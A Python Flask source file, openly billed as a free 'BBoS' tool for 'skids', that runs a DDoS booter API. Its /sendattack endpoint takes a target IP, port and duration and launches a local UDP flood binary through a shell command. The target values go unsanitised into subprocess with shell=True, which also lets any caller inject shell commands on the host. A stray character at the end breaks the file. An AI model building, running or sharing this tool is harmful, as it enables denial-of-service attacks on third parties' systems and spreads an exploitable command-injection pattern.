#--------------------------------#
# Programmed By @Skids.Crying    #
# https://github.com/based-chad  #
# Free BBoS tool for skids       #
# Follow on IG @Skids.crying     #
# https://discord.gg/H4sfJDrs52  #
#--------------------------------#

# Fetures I can add
# Time Limiting
# IP Blacklist
# Validiting IP
# Getting users IP
# And much more 


import subprocess
import time
from flask import Flask, request
import requests
app = Flask(__name__)

a_methods=["home"]


API_KEYS = {
    "secret_key": {"limit": 1, "request_timeout": 30},

}

@app.route('/sendattack/<method>')
def api(method):
    c = "UHJvZ3JhbW1lZCBieSBiYXNlZC1jaGFkLiBodHRwczovL2dpdGh1Yi5jb20vYmFzZWQtY2hhZCwgSUcgQFNraWRzLkNyeWluZw=="

    api_key = request.args.get('api_key')
    ip = request.args.get('ip')
    port = request.args.get('port')
    time_limit = request.args.get('time')
    

    
    if api_key not in API_KEYS:
        return "Not Successful: Invalid API Key"

    if not all([method, ip, port, time_limit]):
        return "Please provide the missing parameter(s): method, ip, port, and time"

    time_limit = int(time_limit)
    api_info = API_KEYS[api_key]

    timeout = min(api_info['request_timeout'], time_limit) if time_limit > 0 else api_info['request_timeout']

    if "counter" not in api_info:
        api_info["counter"] = 0
        api_info["timestamp"] = time.time()

    if api_info["counter"] >= api_info["limit"]:
        if time.time() - api_info["timestamp"] < timeout:
            return "Limit reached for API key"
        else:
            api_info["counter"] = 0
            api_info["timestamp"] = time.time()

    api_info["counter"] += 1
    command = f"nohup ./UDP {ip} {port} 4 4 {timeout}" # Enter Your Script and params here
    subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    response = {
        "method": method,
        "ip": ip,
        "port": port,
        "time": timeout
    }
    return response

if __name__ == '__main__':
    app.run(host='0.0.0.0')d
